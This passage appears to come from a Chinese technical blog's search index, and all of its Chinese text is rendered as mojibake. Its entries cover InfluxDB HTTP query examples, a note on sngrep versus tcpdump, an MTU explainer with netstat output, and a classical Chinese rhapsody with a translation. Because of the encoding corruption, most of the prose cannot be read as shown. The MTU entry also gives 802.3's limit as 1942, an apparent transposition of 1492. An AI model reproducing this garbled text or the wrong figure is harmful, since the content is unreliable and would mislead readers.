0-16ä¸Šé¢çš„å­—æ®µæè¿°çš„æ˜¯DTMPçš„æ”¯æŒã€‚DTMFæ ‡å‡†ï¼Œæ‰€æœ‰SIPå®ä½“è‡³å°‘æ”¯æŒ0-15çš„DTMFäº‹ä»¶ã€‚\n0-9æ˜¯æ•°å­— 10æ˜¯* 11æ˜¯# 12-15å¯¹åº”A,B,C,D å‚è€ƒ https://www.","title":"rtpç¼–ç è¡¨"},{"content":" æŸ¥è¯¢æŸä¸ªå­—æ®µ q=SELECT real_used_size FROM opensips WHERE time \u0026gt; \u0026#39;2019-12-05T00:10:00Z\u0026#39; æ­£å¸¸æŸ¥è¯¢ç»“æœï¼Œä¸‹é¢æ˜¯ä¾‹å­ï¼Œå’Œä¸Šé¢çš„sqlæ²¡æœ‰å…³ç³»ã€‚\n:::warning æ—¶é—´å¿…é¡»ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œä¸èƒ½ç”¨åŒå¼•å·ï¼Œæ ¼å¼ä¹Ÿå¿…é¡»æ˜¯YYYY-MM-DDTHH:MM:SSZ :::\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;statement_id\u0026#34;: 0, \u0026#34;series\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;cpu_load_short\u0026#34;, \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;value\u0026#34; ], \u0026#34;values\u0026#34;: [ [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 2 ], [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 0.55 ], [ \u0026#34;2015-06-11T20:46:02Z\u0026#34;, 0.64 ] ] } ] } ] } å¦‚æœæœ‰æŠ¥é”™ï¼Œæ•°ç»„é¡¹ä¸­çš„æŸä¸€ä¸ªä¼šæœ‰errorå±æ€§ï¼Œå€¼ä¸ºæŠ¥é”™åŸå› \n{ \u0026#34;results\u0026#34;:[ { \u0026#34;statement_id\u0026#34;: 0, \u0026#34;error\u0026#34;: \u0026#34;invalid operation: time and *influxql.StringLiteral are not compatible\u0026#34; } ] } æ‰¹æ¬¡æŸ¥è¯¢ è¯­å¥ä¹‹é—´ç”¨åˆ†å·éš”å¼€\nq=SELECT real_used_size FROM opensips WHERE time \u0026gt; \u0026#39;2019-12-05T00:10:00Z\u0026#39;;SELECT real_used_size FROM opensips WHERE time \u0026gt; \u0026#39;2019-12-09T00:10:00Z\u0026#39; è¿”å›ç»“æœä¸­çš„statement_idå°±è¡¨ç¤ºå¯¹åº”çš„è¯­å¥\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;statement_id\u0026#34;: 0, \u0026#34;series\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;cpu_load_short\u0026#34;, \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;value\u0026#34; ], \u0026#34;values\u0026#34;: [ [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 2 ], [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 0.55 ], [ \u0026#34;2015-06-11T20:46:02Z\u0026#34;, 0.64 ] ] } ] }, { \u0026#34;statement_id\u0026#34;: 1, \u0026#34;series\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;cpu_load_short\u0026#34;, \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;count\u0026#34; ], \u0026#34;values\u0026#34;: [ [ \u0026#34;1970-01-01T00:00:00Z\u0026#34;, 3 ] ] } ] } ] } æŸ¥è¯¢ç»“æœ æŒ‰åˆ†é’Ÿæ±‚å¹³å‡å€¼ q=SELECT MEAN(real_used_size) FROM opensips WHERE time \u0026gt; \u0026#39;2019-12-05T03:10:00Z\u0026#39; GROUP BY time(1m) å…¶ä»–æŸ¥è¯¢å‚æ•° chunked=[true | db=\u0026lt;database_name\u0026gt; epoch=[ns,u,Âµ,ms,s,m,h] p= pretty=true q= u= å‚è€ƒæ•™ç¨‹ æŠ¥é”™å¤„ç†Â https://docs.influxdata.com/influxdb/v1.7/troubleshooting/errors/ æ•°æ®æŸ¥è¯¢Â https://docs.influxdata.com/influxdb/v1.6/guides/querying_data/ å‡½æ•°Â https://docs.influxdata.com/influxdb/v1.7/query_language/functions/ ","permalink":"https://wdd.js.org/posts/2019/12/pv5xgz/","summary":"æŸ¥è¯¢æŸä¸ªå­—æ®µ q=SELECT real_used_size FROM opensips WHERE time \u0026gt; \u0026#39;2019-12-05T00:10:00Z\u0026#39; æ­£å¸¸æŸ¥è¯¢ç»“æœï¼Œä¸‹é¢æ˜¯ä¾‹å­ï¼Œå’Œä¸Šé¢çš„sqlæ²¡æœ‰å…³ç³»ã€‚\n:::warning æ—¶é—´å¿…é¡»ç”¨å•å¼•å·æ‹¬èµ·æ¥ï¼Œä¸èƒ½ç”¨åŒå¼•å·ï¼Œæ ¼å¼ä¹Ÿå¿…é¡»æ˜¯YYYY-MM-DDTHH:MM:SSZ :::\n{ \u0026#34;results\u0026#34;: [ { \u0026#34;statement_id\u0026#34;: 0, \u0026#34;series\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;cpu_load_short\u0026#34;, \u0026#34;columns\u0026#34;: [ \u0026#34;time\u0026#34;, \u0026#34;value\u0026#34; ], \u0026#34;values\u0026#34;: [ [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 2 ], [ \u0026#34;2015-01-29T21:55:43.702900257Z\u0026#34;, 0.55 ], [ \u0026#34;2015-06-11T20:46:02Z\u0026#34;, 0.64 ] ] } ] } ] } å¦‚æœæœ‰æŠ¥é”™ï¼Œæ•°ç»„é¡¹ä¸­çš„æŸä¸€ä¸ªä¼šæœ‰errorå±æ€§ï¼Œå€¼ä¸ºæŠ¥é”™åŸå› \n{ \u0026#34;results\u0026#34;:[ { \u0026#34;statement_id\u0026#34;: 0, \u0026#34;error\u0026#34;: \u0026#34;invalid operation: time and *influxql.StringLiteral are not compatible\u0026#34; } ] } æ‰¹æ¬¡æŸ¥è¯¢ è¯­å¥ä¹‹é—´ç”¨åˆ†å·éš”å¼€","title":"influxdb HTTP æ¥å£å­¦ä¹ "},{"content":"sngrepé•¿æ—¶é—´æŠ“åŒ…ä¼šå¯¼è‡´å†…å­˜å †ç§¯ï¼Œæ‰€ä»¥sngrepåªé€‚åˆçŸ­æ—¶é—´åˆ†ææŠ“åŒ…ï¼Œé•¿æ—¶é—´æŠ“åŒ…éœ€è¦ç”¨tcp-dump\n","permalink":"https://wdd.js.org/opensips/tools/tcp-dump/","summary":"sngrepé•¿æ—¶é—´æŠ“åŒ…ä¼šå¯¼è‡´å†…å­˜å †ç§¯ï¼Œæ‰€ä»¥sngrepåªé€‚åˆçŸ­æ—¶é—´åˆ†ææŠ“åŒ…ï¼Œé•¿æ—¶é—´æŠ“åŒ…éœ€è¦ç”¨tcp-dump","title":"tcp-dump"},{"content":"æœ€å¤§ä¼ è¾“å•å…ƒMTU ä»¥å¤ªç½‘å’Œ802.3å¯¹æ•°æ®å¸§çš„é•¿åº¦æœ‰ä¸ªé™åˆ¶ï¼Œå…¶æœ€å¤§é•¿åº¦åˆ†åˆ«æ˜¯1500å’Œ1942ã€‚é“¾è·¯å±‚çš„è¿™ä¸ªç‰¹æ€§ç§°ä½œMTU,Â æœ€å¤§ä¼ è¾“å•å…ƒã€‚ä¸åŒç±»å‹çš„ç½‘ç»œå¤§å¤šæ•°éƒ½æœ‰ä¸€ä¸ªé™åˆ¶ã€‚\nå¦‚æœIPå±‚çš„æ•°æ®æŠ¥çš„é•¿åº¦æ¯”é“¾è·¯å±‚çš„MTUå¤§ï¼Œé‚£ä¹ˆIPå±‚å°±éœ€è¦åˆ†ç‰‡ï¼Œæ¯ä¸€ç‰‡çš„é•¿åº¦è¦å°äºMTUã€‚\nä½¿ç”¨netstat -inå¯ä»¥æ‰“å°å‡ºç½‘ç»œæ¥å£çš„MTU\nâœ ~ netstat -in Kernel Interface table Iface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg eth2 1500 0 1078767768 2264 689 0 1297577913 0 0 0 BMRU lo 16436 0 734474 0 0 0 734474 0 0 0 LRU è·¯å¾„MTU ä¿¡æ¯ç»è¿‡å¤šä¸ªç½‘ç»œæ—¶ï¼Œä¸åŒç½‘ç»œå¯èƒ½ä¼šæœ‰ä¸åŒçš„MTUï¼Œè€Œå…¶ä¸­æœ€å°çš„ä¸€ä¸ªMTU, ç§°ä¸ºè·¯å¾„MTUã€‚\n","permalink":"https://wdd.js.org/network/xwuvyr/","summary":"æœ€å¤§ä¼ è¾“å•å…ƒMTU ä»¥å¤ªç½‘å’Œ802.3å¯¹æ•°æ®å¸§çš„é•¿åº¦æœ‰ä¸ªé™åˆ¶ï¼Œå…¶æœ€å¤§é•¿åº¦åˆ†åˆ«æ˜¯1500å’Œ1942ã€‚é“¾è·¯å±‚çš„è¿™ä¸ªç‰¹æ€§ç§°ä½œMTU,Â æœ€å¤§ä¼ è¾“å•å…ƒã€‚ä¸åŒç±»å‹çš„ç½‘ç»œå¤§å¤šæ•°éƒ½æœ‰ä¸€ä¸ªé™åˆ¶ã€‚\nå¦‚æœIPå±‚çš„æ•°æ®æŠ¥çš„é•¿åº¦æ¯”é“¾è·¯å±‚çš„MTUå¤§ï¼Œé‚£ä¹ˆIPå±‚å°±éœ€è¦åˆ†ç‰‡ï¼Œæ¯ä¸€ç‰‡çš„é•¿åº¦è¦å°äºMTUã€‚\nä½¿ç”¨netstat -inå¯ä»¥æ‰“å°å‡ºç½‘ç»œæ¥å£çš„MTU\nâœ ~ netstat -in Kernel Interface table Iface MTU Met RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flg eth2 1500 0 1078767768 2264 689 0 1297577913 0 0 0 BMRU lo 16436 0 734474 0 0 0 734474 0 0 0 LRU è·¯å¾„MTU ä¿¡æ¯ç»è¿‡å¤šä¸ªç½‘ç»œæ—¶ï¼Œä¸åŒç½‘ç»œå¯èƒ½ä¼šæœ‰ä¸åŒçš„MTUï¼Œè€Œå…¶ä¸­æœ€å°çš„ä¸€ä¸ªMTU, ç§°ä¸ºè·¯å¾„MTUã€‚","title":"2 é“¾è·¯å±‚"},{"content":"åŸæ–‡ å¤§å¤«ç™»å¾’å­ä¾äºæ¥šç‹ï¼ŒçŸ­å®‹ç‰æ›°ï¼š\u0026ldquo;ç‰ä¸ºäººä½“è²Œé—²ä¸½ï¼Œå£å¤šå¾®è¾ï¼Œåˆæ€§å¥½è‰²ã€‚æ„¿ç‹å‹¿ä¸å‡ºå…¥åå®«ã€‚\u0026rdquo;ã€€ç‹ä»¥ç™»å¾’å­ä¹‹è¨€é—®å®‹ç‰ã€‚\nç‰æ›°ï¼š\u0026ldquo;ä½“è²Œé—²ä¸½ï¼Œæ‰€å—äºå¤©ä¹Ÿï¼›å£å¤šå¾®è¾ï¼Œæ‰€å­¦äºå¸ˆä¹Ÿï¼›è‡³äºå¥½è‰²ï¼Œè‡£æ— æœ‰ä¹Ÿã€‚\u0026rdquo;\nç‹æ›°ï¼š\u0026ldquo;å­ä¸å¥½è‰²ï¼Œäº¦æœ‰è¯´ä¹ï¼Ÿæœ‰è¯´åˆ™æ­¢ï¼Œæ— è¯´åˆ™é€€ã€‚\u0026rdquo;\nç‰æ›°ï¼š\u0026ldquo;å¤©ä¸‹ä¹‹ä½³äººè«è‹¥æ¥šå›½ï¼Œæ¥šå›½ä¹‹ä¸½è€…è«è‹¥è‡£é‡Œï¼Œè‡£é‡Œä¹‹ç¾è€…è«è‹¥è‡£ä¸œå®¶ä¹‹å­ã€‚ä¸œå®¶ä¹‹å­ï¼Œå¢ä¹‹ä¸€åˆ†åˆ™å¤ªé•¿ï¼Œå‡ä¹‹ä¸€åˆ†åˆ™å¤ªçŸ­ ï¼›è‘—ç²‰åˆ™å¤ªç™½ï¼Œæ–½æœ±åˆ™å¤ªèµ¤ï¼›çœ‰å¦‚ç¿ ç¾½ï¼Œè‚Œå¦‚ç™½é›ªï¼›è…°å¦‚æŸç´ ï¼Œé½¿å¦‚å«è´ï¼›å«£ç„¶ä¸€ç¬‘ï¼Œæƒ‘é˜³åŸï¼Œè¿·ä¸‹è”¡ã€‚ç„¶æ­¤å¥³ç™»å¢™çª¥è‡£ä¸‰å¹´ï¼Œè‡³ä»Šæœªè®¸ä¹Ÿã€‚ç™»å¾’å­åˆ™ä¸ç„¶ï¼šå…¶å¦»è“¬å¤´æŒ›è€³ï¼Œé½å”‡å†é½¿ï¼Œæ—è¡Œè¸½å»ï¼Œåˆç–¥ä¸”ç—”ã€‚ç™»å¾’å­æ‚¦ä¹‹ï¼Œä½¿æœ‰äº”å­ã€‚ç‹å­°å¯Ÿä¹‹ï¼Œè°ä¸ºå¥½è‰²è€…çŸ£ã€‚\u0026rdquo;\næ˜¯æ—¶ï¼Œç§¦ç« åå¤§å¤«åœ¨ä¾§ï¼Œå› è¿›è€Œç§°æ›°ï¼š\u0026ldquo;ä»Šå¤«å®‹ç‰ç››ç§°é‚»ä¹‹å¥³ï¼Œä»¥ä¸ºç¾è‰²ï¼Œæ„šä¹±ä¹‹é‚ªï¼›è‡£è‡ªä»¥ä¸ºå®ˆå¾·ï¼Œè°“ä¸å¦‚å½¼çŸ£ã€‚ä¸”å¤«å—æ¥šç©·å··ä¹‹å¦¾ï¼Œç„‰è¶³ä¸ºå¤§ç‹è¨€ä¹?è‹¥è‡£ä¹‹é™‹ï¼Œç›®æ‰€æ›¾ç¹è€…ï¼Œæœªæ•¢äº‘ä¹Ÿã€‚\u0026rdquo;\nç‹æ›°ï¼š\u0026ldquo;è¯•ä¸ºå¯¡äººè¯´ä¹‹ã€‚\u0026rdquo;\nå¤§å¤«æ›°ï¼š\u0026ldquo;å”¯å”¯ã€‚è‡£å°‘æ›¾è¿œæ¸¸ï¼Œå‘¨è§ˆä¹åœŸï¼Œè¶³å†äº”éƒ½ã€‚å‡ºå’¸é˜³ã€ç†™é‚¯éƒ¸ï¼Œä»å®¹éƒ‘ã€å«ã€æº± ã€æ´§ä¹‹é—´ ã€‚æ˜¯æ—¶å‘æ˜¥ä¹‹æœ« ï¼Œè¿å¤ä¹‹é˜³ï¼Œé¸§é¹’å–ˆå–ˆï¼Œç¾¤å¥³å‡ºæ¡‘ã€‚æ­¤éƒŠä¹‹å§ï¼Œåè‰²å«å…‰ï¼Œä½“ç¾å®¹å†¶ï¼Œä¸å¾…é¥°è£…ã€‚è‡£è§‚å…¶ä¸½è€…ï¼Œå› ç§°è¯—æ›°ï¼š\u0026lsquo;éµå¤§è·¯å…®æ½å­ç¥›\u0026rsquo;ã€‚èµ ä»¥èŠ³åè¾ç”šå¦™ã€‚äºæ˜¯å¤„å­æ€³è‹¥æœ‰æœ›è€Œä¸æ¥ï¼Œå¿½è‹¥æœ‰æ¥è€Œä¸è§ã€‚æ„å¯†ä½“ç–ï¼Œä¿¯ä»°å¼‚è§‚ï¼›å«å–œå¾®ç¬‘ï¼Œçªƒè§†æµçœ„ã€‚å¤ç§°è¯—æ›°ï¼š\u0026lsquo;å¯æ˜¥é£å…®å‘é²œè£ï¼Œæ´æ–‹ä¿Ÿå…®æƒ éŸ³å£°ï¼Œèµ æˆ‘å¦‚æ­¤å…®ä¸å¦‚æ— ç”Ÿã€‚\u0026lsquo;å› è¿å»¶è€Œè¾é¿ã€‚ç›–å¾’ä»¥å¾®è¾ç›¸æ„ŸåŠ¨ã€‚ç²¾ç¥ç›¸ä¾å‡­ï¼›ç›®æ¬²å…¶é¢œï¼Œå¿ƒé¡¾å…¶ä¹‰ï¼Œæ‰¬ã€Šè¯—ã€‹å®ˆç¤¼ï¼Œç»ˆä¸è¿‡å·®ï¼Œæ•…è¶³ç§°ä¹Ÿã€‚\u0026rdquo;\näºæ˜¯æ¥šç‹ç§°å–„ï¼Œå®‹ç‰é‚ä¸é€€ã€‚\næˆ‘æ¥ç¿»è¯‘ å£«å¤§å¤«ç™»å¾’å…ˆç”Ÿç«™åœ¨æ¥šç‹èº«æ—ï¼Œè¯„è®ºå®‹ç‰ï¼Œè¯´ï¼šå®‹ç‰è¿™å°ä¼™å­ï¼Œé•¿å¾—å¾ˆå¸…ï¼Œä½†æ˜¯éå¸¸å…«å¦ï¼Œè€Œä¸”å¥½è‰²ï¼Œå»ºè®®æ‚¨ä¸è¦è®©ä»–è¿›å…¥åå®«ã€‚\næ¥šç‹ç”¨ç™»å¾’å…ˆç”Ÿçš„è¯é—®å®‹ç‰ã€‚\nå®‹ç‰äº‰è¾©è¯´ï¼šæˆ‘é•¿å¾—å¸…ï¼Œè¿™æ˜¯çˆ¶æ¯ç”Ÿå¾—å¥½ã€‚æˆ‘æ¯”è¾ƒå…«å¦ï¼Œæ˜¯å› ä¸ºæˆ‘å­¦è¯†å¹¿åšï¼Œå£æ‰å¥½ã€‚è‡³äºè¯´æˆ‘å¥½è‰²ï¼Œé‚£æ˜¯æ²¡æœ‰çš„äº‹æƒ…ã€‚\nå®‹ç‰æ¥ç€è¯´ï¼šâ€œå¤©ä¸‹çš„ç¾å¥³å•Šï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šæ¥šå›½çš„ã€‚æ¥šå›½çš„ç¾å¥³ï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šè‡£é‡Œè¿™ä¸ªåœ°æ–¹çš„ã€‚è‡£é‡Œçš„ç¾å¥³ï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šæˆ‘é‚»å±…å®¶çš„é‚£ä¸ªå§‘å¨˜ã€‚â€\nâ€œé‚£ä¸ªå§‘å¨˜ï¼Œé•¿å¾—å†é«˜ä¸€ç‚¹å°±å¤ªé«˜äº†ï¼Œé•¿å¾—å†ä½ä¸€ç‚¹å°±å¤ªä½äº†ã€‚æ“¦äº†ç²‰åº•çš„è¯å°±å¤ªç™½ï¼Œæ“¦äº†è…®çº¢å°±å¤ªçº¢äº†ã€‚çœ‰æ¯›åƒé»‘è‰²çš„ç¾½æ¯›ï¼Œè‚Œè‚¤åƒç™½é›ªä¸€æ ·ã€‚è…°éå¸¸ç»†ï¼Œç‰™é½¿åƒè´å£³ä¸€æ ·ç™½çš™ã€‚â€\nâ€œå¥¹ä¸€ç¬‘ï¼Œé˜³åŸå’Œä¸‹è”¡è¿™ä¸¤ä¸ªåœ°æ–¹çš„æ‰€æœ‰ç”·äººï¼Œéƒ½ä¼šè¢«è¿·ä½ã€‚â€\nâ€œç„¶è€Œè¿™ä¸ªç¾å¥³ï¼Œå¤©å¤©ç™»ä¸Šæˆ‘å®¶çš„å¢™å¤´å·çª¥æˆ‘ä¸‰å¹´äº†ï¼Œæˆ‘è‡³ä»Šéƒ½æ²¡æœ‰ç­”åº”å¥¹è®©å¥¹ä½œä¸ºæˆ‘å¥³æœ‹å‹ã€‚â€\nâ€œç™»å¾’å…ˆç”Ÿåˆ™ä¸ç„¶ï¼Œä»–è€å©†è“¬å¤´å¢é¢ã€å…”å”‡é¾…ç‰™ã€èµ°è·¯ä½å»ã€è¿˜é•¿ç—”ç–®ã€‚ä½†æ˜¯ç™»å¾’å…ˆç”Ÿå´éå¸¸å–œæ¬¢å¥¹ï¼Œå’Œå¥¹ç”Ÿäº†5ä¸ªå­©å­ã€‚å¤§ç‹ä½ ä»”ç»†æƒ³æƒ³ï¼Œè°æ‰æ˜¯çœŸæ­£çš„å¥½è‰²ï¼Ÿâ€\n","permalink":"https://wdd.js.org/posts/2019/11/wkyqnl/","summary":"åŸæ–‡ å¤§å¤«ç™»å¾’å­ä¾äºæ¥šç‹ï¼ŒçŸ­å®‹ç‰æ›°ï¼š\u0026ldquo;ç‰ä¸ºäººä½“è²Œé—²ä¸½ï¼Œå£å¤šå¾®è¾ï¼Œåˆæ€§å¥½è‰²ã€‚æ„¿ç‹å‹¿ä¸å‡ºå…¥åå®«ã€‚\u0026rdquo;ã€€ç‹ä»¥ç™»å¾’å­ä¹‹è¨€é—®å®‹ç‰ã€‚\nç‰æ›°ï¼š\u0026ldquo;ä½“è²Œé—²ä¸½ï¼Œæ‰€å—äºå¤©ä¹Ÿï¼›å£å¤šå¾®è¾ï¼Œæ‰€å­¦äºå¸ˆä¹Ÿï¼›è‡³äºå¥½è‰²ï¼Œè‡£æ— æœ‰ä¹Ÿã€‚\u0026rdquo;\nç‹æ›°ï¼š\u0026ldquo;å­ä¸å¥½è‰²ï¼Œäº¦æœ‰è¯´ä¹ï¼Ÿæœ‰è¯´åˆ™æ­¢ï¼Œæ— è¯´åˆ™é€€ã€‚\u0026rdquo;\nç‰æ›°ï¼š\u0026ldquo;å¤©ä¸‹ä¹‹ä½³äººè«è‹¥æ¥šå›½ï¼Œæ¥šå›½ä¹‹ä¸½è€…è«è‹¥è‡£é‡Œï¼Œè‡£é‡Œä¹‹ç¾è€…è«è‹¥è‡£ä¸œå®¶ä¹‹å­ã€‚ä¸œå®¶ä¹‹å­ï¼Œå¢ä¹‹ä¸€åˆ†åˆ™å¤ªé•¿ï¼Œå‡ä¹‹ä¸€åˆ†åˆ™å¤ªçŸ­ ï¼›è‘—ç²‰åˆ™å¤ªç™½ï¼Œæ–½æœ±åˆ™å¤ªèµ¤ï¼›çœ‰å¦‚ç¿ ç¾½ï¼Œè‚Œå¦‚ç™½é›ªï¼›è…°å¦‚æŸç´ ï¼Œé½¿å¦‚å«è´ï¼›å«£ç„¶ä¸€ç¬‘ï¼Œæƒ‘é˜³åŸï¼Œè¿·ä¸‹è”¡ã€‚ç„¶æ­¤å¥³ç™»å¢™çª¥è‡£ä¸‰å¹´ï¼Œè‡³ä»Šæœªè®¸ä¹Ÿã€‚ç™»å¾’å­åˆ™ä¸ç„¶ï¼šå…¶å¦»è“¬å¤´æŒ›è€³ï¼Œé½å”‡å†é½¿ï¼Œæ—è¡Œè¸½å»ï¼Œåˆç–¥ä¸”ç—”ã€‚ç™»å¾’å­æ‚¦ä¹‹ï¼Œä½¿æœ‰äº”å­ã€‚ç‹å­°å¯Ÿä¹‹ï¼Œè°ä¸ºå¥½è‰²è€…çŸ£ã€‚\u0026rdquo;\næ˜¯æ—¶ï¼Œç§¦ç« åå¤§å¤«åœ¨ä¾§ï¼Œå› è¿›è€Œç§°æ›°ï¼š\u0026ldquo;ä»Šå¤«å®‹ç‰ç››ç§°é‚»ä¹‹å¥³ï¼Œä»¥ä¸ºç¾è‰²ï¼Œæ„šä¹±ä¹‹é‚ªï¼›è‡£è‡ªä»¥ä¸ºå®ˆå¾·ï¼Œè°“ä¸å¦‚å½¼çŸ£ã€‚ä¸”å¤«å—æ¥šç©·å··ä¹‹å¦¾ï¼Œç„‰è¶³ä¸ºå¤§ç‹è¨€ä¹?è‹¥è‡£ä¹‹é™‹ï¼Œç›®æ‰€æ›¾ç¹è€…ï¼Œæœªæ•¢äº‘ä¹Ÿã€‚\u0026rdquo;\nç‹æ›°ï¼š\u0026ldquo;è¯•ä¸ºå¯¡äººè¯´ä¹‹ã€‚\u0026rdquo;\nå¤§å¤«æ›°ï¼š\u0026ldquo;å”¯å”¯ã€‚è‡£å°‘æ›¾è¿œæ¸¸ï¼Œå‘¨è§ˆä¹åœŸï¼Œè¶³å†äº”éƒ½ã€‚å‡ºå’¸é˜³ã€ç†™é‚¯éƒ¸ï¼Œä»å®¹éƒ‘ã€å«ã€æº± ã€æ´§ä¹‹é—´ ã€‚æ˜¯æ—¶å‘æ˜¥ä¹‹æœ« ï¼Œè¿å¤ä¹‹é˜³ï¼Œé¸§é¹’å–ˆå–ˆï¼Œç¾¤å¥³å‡ºæ¡‘ã€‚æ­¤éƒŠä¹‹å§ï¼Œåè‰²å«å…‰ï¼Œä½“ç¾å®¹å†¶ï¼Œä¸å¾…é¥°è£…ã€‚è‡£è§‚å…¶ä¸½è€…ï¼Œå› ç§°è¯—æ›°ï¼š\u0026lsquo;éµå¤§è·¯å…®æ½å­ç¥›\u0026rsquo;ã€‚èµ ä»¥èŠ³åè¾ç”šå¦™ã€‚äºæ˜¯å¤„å­æ€³è‹¥æœ‰æœ›è€Œä¸æ¥ï¼Œå¿½è‹¥æœ‰æ¥è€Œä¸è§ã€‚æ„å¯†ä½“ç–ï¼Œä¿¯ä»°å¼‚è§‚ï¼›å«å–œå¾®ç¬‘ï¼Œçªƒè§†æµçœ„ã€‚å¤ç§°è¯—æ›°ï¼š\u0026lsquo;å¯æ˜¥é£å…®å‘é²œè£ï¼Œæ´æ–‹ä¿Ÿå…®æƒ éŸ³å£°ï¼Œèµ æˆ‘å¦‚æ­¤å…®ä¸å¦‚æ— ç”Ÿã€‚\u0026lsquo;å› è¿å»¶è€Œè¾é¿ã€‚ç›–å¾’ä»¥å¾®è¾ç›¸æ„ŸåŠ¨ã€‚ç²¾ç¥ç›¸ä¾å‡­ï¼›ç›®æ¬²å…¶é¢œï¼Œå¿ƒé¡¾å…¶ä¹‰ï¼Œæ‰¬ã€Šè¯—ã€‹å®ˆç¤¼ï¼Œç»ˆä¸è¿‡å·®ï¼Œæ•…è¶³ç§°ä¹Ÿã€‚\u0026rdquo;\näºæ˜¯æ¥šç‹ç§°å–„ï¼Œå®‹ç‰é‚ä¸é€€ã€‚\næˆ‘æ¥ç¿»è¯‘ å£«å¤§å¤«ç™»å¾’å…ˆç”Ÿç«™åœ¨æ¥šç‹èº«æ—ï¼Œè¯„è®ºå®‹ç‰ï¼Œè¯´ï¼šå®‹ç‰è¿™å°ä¼™å­ï¼Œé•¿å¾—å¾ˆå¸…ï¼Œä½†æ˜¯éå¸¸å…«å¦ï¼Œè€Œä¸”å¥½è‰²ï¼Œå»ºè®®æ‚¨ä¸è¦è®©ä»–è¿›å…¥åå®«ã€‚\næ¥šç‹ç”¨ç™»å¾’å…ˆç”Ÿçš„è¯é—®å®‹ç‰ã€‚\nå®‹ç‰äº‰è¾©è¯´ï¼šæˆ‘é•¿å¾—å¸…ï¼Œè¿™æ˜¯çˆ¶æ¯ç”Ÿå¾—å¥½ã€‚æˆ‘æ¯”è¾ƒå…«å¦ï¼Œæ˜¯å› ä¸ºæˆ‘å­¦è¯†å¹¿åšï¼Œå£æ‰å¥½ã€‚è‡³äºè¯´æˆ‘å¥½è‰²ï¼Œé‚£æ˜¯æ²¡æœ‰çš„äº‹æƒ…ã€‚\nå®‹ç‰æ¥ç€è¯´ï¼šâ€œå¤©ä¸‹çš„ç¾å¥³å•Šï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šæ¥šå›½çš„ã€‚æ¥šå›½çš„ç¾å¥³ï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šè‡£é‡Œè¿™ä¸ªåœ°æ–¹çš„ã€‚è‡£é‡Œçš„ç¾å¥³ï¼Œæ²¡æœ‰æ¯”å¾—ä¸Šæˆ‘é‚»å±…å®¶çš„é‚£ä¸ªå§‘å¨˜ã€‚â€\nâ€œé‚£ä¸ªå§‘å¨˜ï¼Œé•¿å¾—å†é«˜ä¸€ç‚¹å°±å¤ªé«˜äº†ï¼Œé•¿å¾—å†ä½ä¸€ç‚¹å°±å¤ªä½äº†ã€‚æ“¦äº†ç²‰åº•çš„è¯å°±å¤ªç™½ï¼Œæ“¦äº†è…®çº¢å°±å¤ªçº¢äº†ã€‚çœ‰æ¯›åƒé»‘è‰²çš„ç¾½æ¯›ï¼Œè‚Œè‚¤åƒç™½é›ªä¸€æ ·ã€‚è…°éå¸¸ç»†ï¼Œç‰™é½¿åƒè´å£³ä¸€æ ·ç™½çš™ã€‚â€\nâ€œå¥¹ä¸€ç¬‘ï¼Œé˜³åŸå’Œä¸‹è”¡è¿™ä¸¤ä¸ªåœ°æ–¹çš„æ‰€æœ‰ç”·äººï¼Œéƒ½ä¼šè¢«è¿·ä½ã€‚â€\nâ€œç„¶è€Œè¿™ä¸ªç¾å¥³ï¼Œå¤©å¤©ç™»ä¸Šæˆ‘å®¶çš„å¢™å¤´å·çª¥æˆ‘ä¸‰å¹´äº†ï¼Œæˆ‘è‡³ä»Šéƒ½æ²¡æœ‰ç­”åº”å¥¹è®©å¥¹ä½œä¸ºæˆ‘å¥³æœ‹å‹ã€‚â€\nâ€œç™»å¾’å…ˆç”Ÿåˆ™ä¸ç„¶ï¼Œä»–è€å©†è“¬å¤´å¢é¢ã€å…”å”‡é¾…ç‰™ã€èµ°è·¯ä½å»ã€è¿˜é•¿ç—”ç–®ã€‚ä½†æ˜¯ç™»å¾’å…ˆç”Ÿå´éå¸¸å–œæ¬¢å¥¹ï¼Œå’Œå¥¹ç”Ÿäº†5ä¸ªå­©å­ã€‚å¤§ç‹ä½ ä»”ç»†æƒ³æƒ³ï¼Œè°æ‰æ˜¯çœŸæ­£çš„å¥½è‰²ï¼Ÿâ€","title":"ç™»å¾’å­å¥½è‰²èµ‹"},{"content":"é»„åˆä¸‰å¹´ï¼Œä½™æœäº¬å¸ˆï¼Œè¿˜æµæ´›å·ã€‚å¤äººæœ‰è¨€ï¼šæ–¯æ°´ä¹‹ç¥ï¼Œåæ›°å®“å¦ƒã€‚æ„Ÿå®‹ç‰å¯¹æ¥šç‹ç¥å¥³ä¹‹äº‹ï¼Œé‚ä½œæ–¯èµ‹ã€‚å…¶è¯æ›°ï¼š\nä½™ä»äº¬åŸŸï¼Œè¨€å½’ä¸œè—©ï¼ŒèƒŒä¼Šé˜™ï¼Œè¶Šè½˜è¾•ï¼Œç»é€šè°·ï¼Œé™µæ™¯å±±ã€‚æ—¥æ—¢è¥¿å€¾ï¼Œè½¦æ®†é©¬çƒ¦ã€‚å°”ä¹ƒç¨é©¾ä¹è˜…çš‹ï¼Œç§£é©·ä¹èŠç”°ï¼Œå®¹ä¸ä¹é˜³æ—ï¼Œæµçœ„ä¹æ´›å·ã€‚äºæ˜¯